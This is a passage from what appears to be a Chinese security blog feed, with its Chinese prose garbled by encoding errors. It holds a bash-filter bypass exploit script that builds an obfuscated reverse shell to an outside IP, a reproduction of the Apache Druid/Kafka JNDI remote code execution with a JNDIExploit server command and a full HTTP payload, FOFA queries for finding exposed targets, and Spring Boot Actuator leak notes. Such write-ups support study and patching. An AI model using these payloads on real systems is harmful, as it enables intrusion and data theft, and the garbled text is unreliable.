çš„å…«é€²åˆ¶ï¼‰</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ echo $&#x27;\154&#x27;$&#x27;\163&#x27;</span><br><span class="line">ls</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>è¿›åˆ¶è½¬æ¢</p><blockquote><p>$((xè¿›åˆ¶#æ•°å­—))ï¼šå°†xè¿›åˆ¶çš„æ•°å­—è½¬ä¸º10è¿›åˆ¶</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ echo $((2#111))</span><br><span class="line">7</span><br></pre></td></tr></table></figure></li><li><p>è·å–å­—ç¬¦ä¸²é•¿åº¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ string=&quot;abcd&quot;</span><br><span class="line">echo $&#123;#string&#125;  </span><br><span class="line">4</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><code>$#</code> </p><blockquote><p>ä¼ é€’ç»™è„šæœ¬å‚æ•°çš„ä¸ªæ•°</p></blockquote></li><li><p><code>$$</code></p><blockquote><p><code>$$</code> ä»£è¡¨çš„æ˜¯ç›®å‰çš„ pid </p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ echo $$  </span><br><span class="line">21226</span><br><span class="line">                                                                                                                              </span><br><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ ps                </span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">  21226 pts/0    00:00:05 zsh</span><br><span class="line">  41100 pts/0    00:00:00 ps</span><br><span class="line">  </span><br><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ echo $(($#&lt;$$))</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li><li><p><code>$0</code></p><blockquote><p>ä¿å­˜è„šæœ¬å</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ echo $0                                                                                   bash</span><br></pre></td></tr></table></figure></li><li><p><code>&lt;&lt;&lt;</code> </p><blockquote><p><code>&lt;&lt;&lt;</code> çš„ç”¨é€”æ˜¯å°‡ä»»æ„å­—ä¸²äº¤ç”±å‰é¢çš„æŒ‡ä»¤åŸ·è¡Œ</p></blockquote></li></ol><p>æ€è·¯ï¼šå› ä¸ºshellèƒ½å¤Ÿè§£æè§£æå…«è¿›åˆ¶ï¼Œæ‰€ä»¥æ„é€ å‡º0~7æ•°å­—ï¼Œå°†å‘½ä»¤è½¬æ¢ä¸ºå…«è¿›åˆ¶ã€‚</p><p>exp</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">n = dict()</span><br><span class="line">n[0] = &#x27;0&#x27;#0</span><br><span class="line">n[1] = &#x27;$&#123;##&#125;&#x27;#1</span><br><span class="line">n[2] = &#x27;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))&#x27;#2 ä½è¿ç®—</span><br><span class="line">n[3] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))&#x27;#3 è¿›åˆ¶è½¬æ¢</span><br><span class="line">n[4] = &#x27;$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))&#x27;#4 è¿›åˆ¶è½¬æ¢</span><br><span class="line">n[5] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;))&#x27;</span><br><span class="line">n[6] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;0))&#x27;</span><br><span class="line">n[7] = &#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))&#x27;</span><br><span class="line"></span><br><span class="line">f=&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def str_to_oct(cmd):                                #å‘½ä»¤è½¬æ¢æˆå…«è¿›åˆ¶å­—ç¬¦ä¸²</span><br><span class="line">    s = &quot;&quot;</span><br><span class="line">    for t in cmd:</span><br><span class="line">        o = (&#x27;%s&#x27; % (oct(ord(t))))[2:]</span><br><span class="line">        s+=&#x27;\\&#x27;+o   </span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">def build(cmd):                                     #å…«è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢æˆå­—ç¬¦</span><br><span class="line">    payload = &quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span><br><span class="line">    s = str_to_oct(cmd).split(&#x27;\\&#x27;)</span><br><span class="line">    for _ in s[1:]:</span><br><span class="line">        payload+=&quot;\\\\&quot;</span><br><span class="line">        for i in _:</span><br><span class="line">            payload+=n[int(i)]</span><br><span class="line">    return payload+&#x27;\\\&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def get_flag(url,payload):                          #ç›²æ³¨å‡½æ•°</span><br><span class="line">    try:</span><br><span class="line">        data = &#123;&#x27;cmd&#x27;:payload&#125;</span><br><span class="line">        r = requests.post(url,data,timeout=1.5)</span><br><span class="line">    except:</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">åå¼¹shell</span></span><br><span class="line">print(build(&#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;))</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ç›²æ³¨</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">a=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#123;&#125;@&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">        cmd=f<span class="string">&#x27;cat /flag|grep ^&#123;f+j&#125;&amp;&amp;sleep 3&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">        url = <span class="string">&quot;http://ip/&quot;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">        <span class="keyword">if</span> get_flag(url,build(cmd)):</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">            <span class="built_in">break</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    f = f+j</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">    <span class="built_in">print</span>(f)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache Druid RCEæ¼æ´å¤ç°(QVD-2023-9629)</title>
      <link href="/2023/06/24/%E9%98%BF%E9%87%8Cdrupid/"/>
      <url>/2023/06/24/%E9%98%BF%E9%87%8Cdrupid/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><a href="https://github.com/vulhub/vulhub/tree/master">vulhub</a>&#x2F;<a href="https://github.com/vulhub/vulhub/tree/master/kafka">kafka</a>&#x2F;<a href="https://github.com/vulhub/vulhub/tree/master/kafka/CVE-2023-25194">CVE-2023-25194</a></p><p><img src="/../images/image-20230624162154282.png" alt="image-20230624162154282"></p><h2 id="Fofaè¯­æ³•"><a href="#Fofaè¯­æ³•" class="headerlink" title="Fofaè¯­æ³•"></a>Fofaè¯­æ³•</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;Apache Druid&quot;         866 æ¡</span><br><span class="line">js_name=&quot;console-config.js&quot;   850 æ¡</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>Apache Kafka clientsä¸­å­˜åœ¨ä¸€å¤„<strong>JNDIæ³¨å…¥</strong>æ¼æ´ã€‚å¦‚æœæ”»å‡»è€…åœ¨è¿æ¥çš„æ—¶å€™å¯ä»¥æ§åˆ¶å±æ€§<code>sasl.jaas.config</code>çš„å€¼ä¸º<code>com.sun.security.auth.module.JndiLoginModule</code>ï¼Œåˆ™å¯ä»¥å‘èµ·JNDIè¿æ¥ï¼Œè¿›è€Œå¯¼è‡´JNDIæ³¨å…¥æ¼æ´ï¼Œ<strong>æ‰§è¡Œä»»æ„å‘½ä»¤</strong>ã€‚</p><h2 id="å½±å“ç‰ˆæœ¬å’Œè½¯ä»¶"><a href="#å½±å“ç‰ˆæœ¬å’Œè½¯ä»¶" class="headerlink" title="å½±å“ç‰ˆæœ¬å’Œè½¯ä»¶"></a>å½±å“ç‰ˆæœ¬å’Œè½¯ä»¶</h2><p>2.3.0 &lt;&#x3D; Apache Kafka &lt;&#x3D; 3.3.2</p><p>ä½¿ç”¨Apache Kafkaçš„è½¯ä»¶<strong>Apache Druid</strong></p><blockquote><p>Apache Druidæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„å®æ—¶å¤§æ•°æ®åˆ†æå¼•æ“ï¼Œæ”¯æŒå¿«é€Ÿæ•°æ®æ‘„å–ã€å®æ—¶æŸ¥è¯¢å’Œæ•°æ®å¯è§†åŒ–ã€‚å®ƒä¸»è¦ç”¨äºOLAPï¼ˆåœ¨çº¿åˆ†æå¤„ç†ï¼‰åœºæ™¯ï¼Œèƒ½å¤„ç†PBçº§åˆ«çš„æ•°æ®ã€‚Druidå…·æœ‰é«˜åº¦å¯æ‰©å±•ã€ä½å»¶è¿Ÿå’Œé«˜ååé‡çš„ç‰¹ç‚¹ï¼Œå¹¿æ³›åº”ç”¨äºå®æ—¶ç›‘æ§ã€äº‹ä»¶é©±åŠ¨åˆ†æã€ç”¨æˆ·è¡Œä¸ºåˆ†æã€ç½‘ç»œå®‰å…¨ç­‰é¢†åŸŸã€‚é€šè¿‡ä½¿ç”¨Druidï¼Œä¼ä¸šå’Œå¼€å‘è€…å¯ä»¥å¿«é€Ÿè·å¾—å®æ—¶åˆ†æç»“æœï¼Œæå‡å†³ç­–æ•ˆç‡ã€‚</p><p>è¯¥åº”ç”¨çš„å†å²æ¼æ´ï¼š</p><h5 id="Apache-Druid-JDBCååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26919ï¼‰"><a href="#Apache-Druid-JDBCååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26919ï¼‰" class="headerlink" title="Apache Druid JDBCååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26919ï¼‰"></a>Apache Druid JDBCååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26919ï¼‰</h5><h5 id="Apache-Druid-log4j-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#Apache-Druid-log4j-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="Apache Druid log4j è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>Apache Druid log4j è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h5><p><strong>æœªæˆæƒè®¿é—®æ¼æ´</strong></p></blockquote><p><strong>å½±å“ç‰ˆæœ¬0.19.0 &lt;&#x3D; Apache Druid &lt;&#x3D; 25.0.0</strong></p><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>å¼€å¯ldapæœåŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.1-SNAPSHOT.jar -i 124.220.192.120</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230624155944899.png" alt="image-20230624155944899"></p><p>å‘é€payloadï¼Œæ›¿æ¢å…¶ä¸­çš„LDAP URL</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/druid/indexer/v1/sampler?for=connect</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;spec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;ioConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;consumerProperties&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;bootstrap.servers&quot;</span>:<span class="string">&quot;127.0.0.1:6666&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.mechanism&quot;</span>:<span class="string">&quot;SCRAM-SHA-256&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;security.protocol&quot;</span>:<span class="string">&quot;SASL_SSL&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.jaas.config&quot;</span>:<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=<span class="subst">\&quot;</span>ldap://roguo-jndi-server:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=<span class="subst">\&quot;</span> useFirstPass=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> serviceName=<span class="subst">\&quot;</span>x<span class="subst">\&quot;</span> debug=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> group.provider.url=<span class="subst">\&quot;</span>xxx<span class="subst">\&quot;</span>;&quot;</span></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;topic&quot;</span>:<span class="string">&quot;test&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;useEarliestOffset&quot;</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;inputFormat&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;([<span class="subst">\\</span>s<span class="subst">\\</span>S]*)&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;listDelimiter&quot;</span>:<span class="string">&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;columns&quot;</span>:[</span></span><br><span class="line"><span class="language-swift">                    <span class="string">&quot;raw&quot;</span></span></span><br><span class="line"><span class="language-swift">                ]</span></span><br><span class="line"><span class="language-swift">            &#125;</span></span><br><span class="line"><span class="language-swift">        &#125;,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;dataSchema&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;timestampSpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;dimensionsSpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift"></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;granularitySpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;rollup&quot;</span>:<span class="literal">false</span></span></span><br><span class="line"><span class="language-swift">            &#125;</span></span><br><span class="line"><span class="language-swift">        &#125;,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;tuningConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span></span></span><br><span class="line"><span class="language-swift">        &#125;</span></span><br><span class="line"><span class="language-swift">    &#125;,</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;samplerConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span></span></span><br><span class="line"><span class="language-swift">    &#125;</span></span><br><span class="line"><span class="language-swift">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230624155828710.png" alt="image-20230624155828710"></p><p><img src="/../images/image-20230624155800506.png" alt="image-20230624155800506"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><ul><li><p>ä¸ºApache Druid å¼€å¯è®¤è¯é…ç½®ã€‚</p><p><a href="https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html">https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html</a></p></li><li><p>å‡çº§ç‰ˆæœ¬</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Springæ¡†æ¶æ¼æ´</title>
      <link href="/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¨èé˜…è¯»"><a href="#æ¨èé˜…è¯»" class="headerlink" title="æ¨èé˜…è¯»"></a>æ¨èé˜…è¯»</h2><p><a href="https://github.com/LandGrey/SpringBootVulExploit#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">LandGrey&#x2F;SpringBootVulExploit: SpringBoot ç›¸å…³æ¼æ´å­¦ä¹ èµ„æ–™ï¼Œåˆ©ç”¨æ–¹æ³•å’ŒæŠ€å·§åˆé›†ï¼Œé»‘ç›’å®‰å…¨è¯„ä¼° check list</a></p><p><a href="https://xz.aliyun.com/t/9763">https://xz.aliyun.com/t/9763</a></p><h2 id="Springæ¦‚è¿°"><a href="#Springæ¦‚è¿°" class="headerlink" title="Springæ¦‚è¿°"></a>Springæ¦‚è¿°</h2><p>Spring Framework æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨ç¨‹åºæ¡†æ¶å’Œ Java å¹³å°çš„æ§åˆ¶å®¹å™¨çš„åè½¬ã€‚ç”±äºå…¶å¼ºå¤§çš„åŠŸèƒ½å’Œæ˜“ç”¨æ€§ï¼Œå®ƒåœ¨è¡Œä¸šä¸­è¢«å„ç§ç¨‹åºå’Œç³»ç»Ÿå¹¿æ³›ä½¿ç”¨ã€‚ä¸€äº›çŸ¥åäº§å“å¦‚ Spring Boot å’Œ Spring Cloud éƒ½æ˜¯ä½¿ç”¨ Spring Framework å¼€å‘çš„ã€‚</p><h2 id="æ¡†æ¶ç‰¹å¾"><a href="#æ¡†æ¶ç‰¹å¾" class="headerlink" title="æ¡†æ¶ç‰¹å¾"></a>æ¡†æ¶ç‰¹å¾</h2><ul><li><p>å¦‚æœ Web åº”ç”¨ç¨‹åºçš„ favicon.ico å›¾æ ‡é»˜è®¤æ²¡æœ‰æ›´æ”¹ï¼Œæ˜¯ä¸€ä¸ªå°ç»¿å¶<br><img src="/../images/image-20230622113805635.png" alt="image-20230622113805635"></p><p>FoFaè¯­æ³•</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;116323821&quot;</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœ web åº”ç”¨å¼€å‘è€…æ²¡æœ‰ä¿®æ”¹ SpringBoot Web åº”ç”¨çš„é»˜è®¤ 4xxã€5xx æŠ¥é”™é¡µé¢ï¼Œé‚£ä¹ˆå½“ web åº”ç”¨ç¨‹åºå‡ºç° 4xxã€5xx é”™è¯¯æ—¶ï¼Œä¼šæŠ¥é”™å¦‚ä¸‹å›¾ï¼š</p><p><img src="/../images/image-20230622113724212.png" alt="image-20230622113724212"></p><p>FoFaè¯­æ³•</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">body=&quot;Whitelabel Error Page&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="spelè¡¨è¾¾å¼"><a href="#spelè¡¨è¾¾å¼" class="headerlink" title="spelè¡¨è¾¾å¼"></a>spelè¡¨è¾¾å¼</h2><p><a href="https://www.wangan.com/p/7fy7f6cf77af4b1a">https://www.wangan.com/p/7fy7f6cf77af4b1a</a></p><h2 id="Spring-Boot-Actuatoræ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#Spring-Boot-Actuatoræ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="Spring Boot Actuatoræ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>Spring Boot Actuatoræ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><h3 id="Actuatoræ¦‚è¿°"><a href="#Actuatoræ¦‚è¿°" class="headerlink" title="Actuatoræ¦‚è¿°"></a>Actuatoræ¦‚è¿°</h3><p>â€‹Actuator æ˜¯ springboot æä¾›çš„ç”¨æ¥å¯¹åº”ç”¨ç³»ç»Ÿè¿›è¡Œè‡ªçœå’Œç›‘æ§çš„åŠŸèƒ½æ¨¡å—ï¼Œå€ŸåŠ©äº Actuator å¼€å‘è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¯¹åº”ç”¨ç³»ç»ŸæŸäº›ç›‘æ§æŒ‡æ ‡è¿›è¡ŒæŸ¥çœ‹ã€ç»Ÿè®¡ç­‰ã€‚åœ¨ Actuator å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšå¥½ç›¸å…³æƒé™æ§åˆ¶ï¼Œéæ³•ç”¨æˆ·å¯é€šè¿‡è®¿é—®é»˜è®¤çš„æ‰§è¡Œå™¨ç«¯ç‚¹ï¼ˆendpointsï¼‰æ¥è·å–åº”ç”¨ç³»ç»Ÿä¸­çš„ç›‘æ§ä¿¡æ¯ï¼Œä»è€Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ç”šè‡³æœåŠ¡å™¨è¢«æ¥ç®¡çš„äº‹ä»¶å‘ç”Ÿã€‚</p><p>â€‹å…¶æä¾›çš„æ‰§è¡Œå™¨ç«¯ç‚¹åˆ†ä¸ºä¸¤ç±»ï¼šåŸç”Ÿç«¯ç‚¹å’Œç”¨æˆ·è‡ªå®šä¹‰æ‰©å±•ç«¯ç‚¹ï¼ŒåŸç”Ÿç«¯ç‚¹ä¸»è¦æœ‰ï¼š</p><p><img src="/../images/v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg" alt="v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg"></p><h4 id="ç‰ˆæœ¬é—®é¢˜"><a href="#ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="ç‰ˆæœ¬é—®é¢˜"></a>ç‰ˆæœ¬é—®é¢˜</h4><ul><li><p><code>Spring Boot</code> &lt; 1.5ï¼šé»˜è®¤æœªæˆæƒè®¿é—®æ‰€æœ‰ç«¯ç‚¹ã€</p></li><li><p><code>Spring Boot</code> &gt;&#x3D; 1.5ï¼šé»˜è®¤åªå…è®¸è®¿é—® <code>/health</code> å’Œ <code>/info</code> ç«¯ç‚¹ï¼Œä½†æ˜¯æ­¤å®‰å…¨æ€§é€šå¸¸è¢«åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜ç¦ç”¨äº†</p></li><li><p><code>Spring Boot</code>2.xç›¸æ¯”äº1.xç‰ˆæœ¬çš„ç«¯ç‚¹å¤šäº†ä¸ªå‰ç¼€ <code>/actuator</code>ï¼Œå¦‚<code>/health</code> å˜æˆäº†<code>/actuator/health</code>ã€‚</p></li></ul><h4 id="ç«¯ç‚¹è·¯å¾„"><a href="#ç«¯ç‚¹è·¯å¾„" class="headerlink" title="ç«¯ç‚¹è·¯å¾„"></a>ç«¯ç‚¹è·¯å¾„</h4><p>è®¾ç½®ç®¡ç†ç«¯ç‚¹çš„è·¯å¾„:</p><p>åœ¨1.xç‰ˆæœ¬ä¸‹ï¼Œè®¾ç½®è¯­å¥å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.context-path =/manage</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ç«¯ç‚¹çš„è®¿é—®æ–¹å¼å°±å˜ä¸ºäº†:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/manage/dump</span><br><span class="line">/manage/autoconfig</span><br><span class="line">/manage/metrics</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>åœ¨2.xç‰ˆæœ¬ï¼Œè®¾ç½®è¯­å¥å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.endpoints.web.base-path=/manage</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ç«¯ç‚¹çš„è®¿é—®æ–¹å¼å°±å˜ä¸ºäº†:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /actuatorè¢«manageä»£æ›¿</span><br><span class="line"></span><br><span class="line">/manage/dump</span><br><span class="line">/manage/autoconfig</span><br><span class="line">/manage/metrics</span><br><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>æœ‰äº›äººå¯èƒ½å–œæ¬¢å°†å…¶å‘½åä¸º<code>monitor</code>,æ‰€ä»¥çŸ¥é“è¿™ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é€‚å½“ä¸°å¯Œä¸‹è‡ªå·±çš„å­—å…¸ã€‚</p></blockquote><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="x2F-mappings"><a href="#x2F-mappings" class="headerlink" title="&#x2F;mappings"></a>&#x2F;mappings</h4><p>æ³„éœ²è·¯ç”±ä¿¡æ¯</p><p><img src="/../images/image-20230623215633942.png" alt="image-20230623215633942"></p><h4 id="x2F-traceï¼Œ-x2F-httptrace"><a href="#x2F-traceï¼Œ-x2F-httptrace" class="headerlink" title="&#x2F;traceï¼Œ&#x2F;httptrace"></a>&#x2F;traceï¼Œ&#x2F;httptrace</h4><ul><li><p>è·å–åŸºæœ¬çš„ HTTP è¯·æ±‚è·Ÿè¸ªä¿¡æ¯ï¼ˆæ—¶é—´æˆ³ã€HTTP å¤´ç­‰ï¼‰</p></li><li><p>å­˜åœ¨çš„éšæ‚£ï¼šå¦‚æœå­˜åœ¨ç™»å½•ç”¨æˆ·çš„æ“ä½œè¯·æ±‚ï¼Œå¯ä»¥ä¼ªé€ cookieè¿›è¡Œç™»å½•ã€‚</p></li></ul><p><img src="/../images/image-20230623215702605.png" alt="image-20230623215702605"></p><p>æ³¨æ„ï¼šè¿™ä¸ªåªæ˜¯æ˜¾ç¤ºæœ€è¿‘çš„100æ¡æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å†™è„šæœ¬æ¥æŒç»­ç›‘æ§ã€‚</p><h4 id="x2F-env"><a href="#x2F-env" class="headerlink" title="&#x2F;env"></a>&#x2F;env</h4><ul><li><p>è·å–å…¨éƒ¨ç¯å¢ƒå±æ€§</p></li><li><p>å­˜åœ¨çš„éšæ‚£</p><ul><li><p>å¯èƒ½ä¼šæ³„éœ²æ•°æ®åº“è´¦å·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯,ä½†æ˜¯æ³„éœ²çš„å¯†ç ä¼šç”¨æ˜Ÿå·è¿›è¡Œè„±æ•ï¼Œæƒ³è¦è·å–ç›¸åº”çš„æ˜æ–‡å¯†ç ï¼Œå¯ä»¥å°è¯•é€šè¿‡åˆ†æheapdumpæ•°æ®çš„æ–¹å¼</p></li><li><p><strong>eureka xstream  